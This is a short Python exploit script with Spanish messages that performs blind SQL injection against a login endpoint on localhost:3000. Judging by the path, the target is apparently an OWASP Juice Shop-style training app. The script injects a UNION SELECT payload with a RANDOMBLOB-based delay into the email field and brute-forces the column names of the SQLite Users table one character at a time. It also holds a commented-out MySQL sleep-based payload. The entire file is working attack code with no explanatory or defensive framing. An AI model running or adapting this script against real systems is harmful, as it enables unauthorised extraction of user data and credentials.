import requests
import signal
import sys
import time 
import string
from pwn import *

main_url = "http://localhost:3000/rest/user/login"
characters2 = string.printable
characters = string.ascii_letters + string.digits + ':'


def def_handler(sig,frame):
    print("saliendo")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)    

def makeSQLI():
    p1 = log.progress("fuerza bruta")
    p1.status("iniciando fuerza bruta")
    time.sleep(2)
    p2= log.progress("datos extraidos")
    extracted_info = ""
    for position in range(1,60):
        for character in characters:
            # sqli_url = main_url + "?category_id=1 and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),%d,1))=%d,sleep(0.1),1)" % (position,character)
            
            datos = {"email":"test@test.com' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CASE WHEN ((SUBSTR((SELECT GROUP_CONCAT(name,':') AS column_names FROM pragma_table_info('Users')),%d,1)='%s')) then 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) ELSE 1 END --" % (position,character),"password":"asd'" }

            p1.status(f"estado:posi:{position}, {character}")

            r = requests.post(main_url,json=datos,timeout=20)
            if r.status_code == 500:
                extracted_info += character
                p2.status(extracted_info)
                break

makeSQLI()
